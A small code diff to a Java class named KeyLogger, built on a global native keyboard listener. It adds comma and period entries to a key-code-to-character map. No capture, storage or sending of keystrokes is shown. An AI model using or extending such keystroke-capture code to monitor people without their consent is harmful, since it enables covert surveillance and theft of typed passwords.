@@ -59,6 +59,8 @@ public class KeyLogger implements NativeKeyListener {
     	keyword.put(NativeKeyEvent.VC_Y,"y");
     	keyword.put(NativeKeyEvent.VC_Z,"z");
     	keyword.put(NativeKeyEvent.VC_SPACE," ");
+    	keyword.put(NativeKeyEvent.VC_COMMA, ",");
+    	keyword.put(NativeKeyEvent.VC_PERIOD,".");
 	
 	}
 	
